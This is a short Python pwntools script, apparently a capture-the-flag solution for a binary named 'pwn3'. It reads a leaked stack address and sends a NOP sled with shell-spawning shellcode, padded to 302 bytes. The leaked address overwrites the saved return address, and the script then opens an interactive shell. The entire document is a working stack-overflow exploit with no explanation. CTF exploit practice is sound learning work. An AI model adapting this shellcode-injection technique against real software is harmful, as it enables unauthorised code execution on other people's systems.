from pwn import *



elf = context.binary = ELF("./pwn3")
p = process()
p.recvuntil(b"journey ")
STACK_LEAK  =  int(p.recvline().decode()[2:-2],16)

# gdb.attach(p)

payload = asm(shellcraft.nop()) * 20 
payload += asm(shellcraft.sh()) 
payload = payload.ljust(302,asm(shellcraft.nop()))
payload += flat(STACK_LEAK)

p.sendline(payload)

p.interactive()